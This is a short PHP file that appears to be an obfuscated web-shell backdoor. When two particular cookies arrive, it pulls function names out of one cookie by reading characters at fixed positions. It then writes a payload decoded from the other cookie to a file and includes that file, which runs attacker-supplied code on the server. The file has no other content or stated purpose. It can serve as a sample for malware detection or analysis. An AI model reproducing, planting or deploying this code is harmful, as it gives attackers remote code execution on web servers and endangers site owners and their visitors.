<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[15])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 7;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[15][$n];
        if (!$c[15][$n + 1]) {
            if (!$c[15][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 7 + 1;
    }
    $k = $p[29]() . $p[3];
    if (!$p[24]($k)) {
        $n = $p[9]($k, $p[19]);
        $p[8]($n, $p[5] . $p[20]($p[4]($c[3])));
    }
    include($k);
}